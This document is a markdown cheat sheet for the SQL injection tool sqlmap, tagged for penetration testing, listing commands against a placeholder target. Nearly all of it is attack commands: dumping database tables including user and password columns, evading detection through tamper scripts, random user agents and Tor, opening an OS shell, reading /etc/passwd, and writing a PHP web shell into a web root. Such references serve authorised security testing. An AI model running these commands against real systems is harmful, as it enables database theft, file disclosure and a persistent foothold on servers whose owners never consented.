---
description: Automated SQL injection detection and exploitation tool
tags: [sql, injection, database, pentest]
---

# sqlmap

## Basic Detection
    sqlmap -u "http://target/?id=1"
    sqlmap -u "http://target/?id=1" --dbs           # enumerate databases
    sqlmap -u "http://target/?id=1" -D dbname --tables   # enumerate tables
    sqlmap -u "http://target/?id=1" -D dbname -T users --columns
    sqlmap -u "http://target/?id=1" -D dbname -T users -C user,pass --dump

## POST Requests
    sqlmap -u "http://target/login" --data="user=admin&pass=1"
    sqlmap -u "http://target/login" --data="user=admin&pass=1" -p user   # test only 'user'

## Request from File (Burp)
    sqlmap -r request.txt                  # intercept with Burp, save, replay here
    sqlmap -r request.txt --level=5 --risk=3

## Cookies & Sessions
    sqlmap -u "http://target/" --cookie="PHPSESSID=abc123; auth=1"
    sqlmap -u "http://target/" -H "Authorization: Bearer <token>"

## Techniques
    sqlmap -u "http://target/?id=1" --technique=BEUSTQ    # all techniques
    sqlmap -u "http://target/?id=1" --technique=B         # boolean-based blind only
    sqlmap -u "http://target/?id=1" --technique=T         # time-based blind only

## Evading Detection
    sqlmap -u "http://target/?id=1" --tamper=space2comment
    sqlmap -u "http://target/?id=1" --random-agent
    sqlmap -u "http://target/?id=1" --delay=1 --level=1
    sqlmap -u "http://target/?id=1" --tor --tor-type=SOCKS5

## DBMS-Specific
    sqlmap -u "http://target/?id=1" --dbms=mysql
    sqlmap -u "http://target/?id=1" --dbms=mssql --os-shell   # interactive OS shell (MSSQL)
    sqlmap -u "http://target/?id=1" --dbms=mysql --file-read="/etc/passwd"
    sqlmap -u "http://target/?id=1" --dbms=mysql --file-write="shell.php" --file-dest="/var/www/html/shell.php"

## Level & Risk
    --level=1-5    # test scope (1=default, 5=headers/referer)
    --risk=1-3     # payload aggressiveness (1=default, 3=heavy/OR-based)

## Output & Misc
    sqlmap -u "http://target/?id=1" --batch             # non-interactive
    sqlmap -u "http://target/?id=1" --flush-session     # clear cached results
    sqlmap -u "http://target/?id=1" --threads=5         # parallel requests
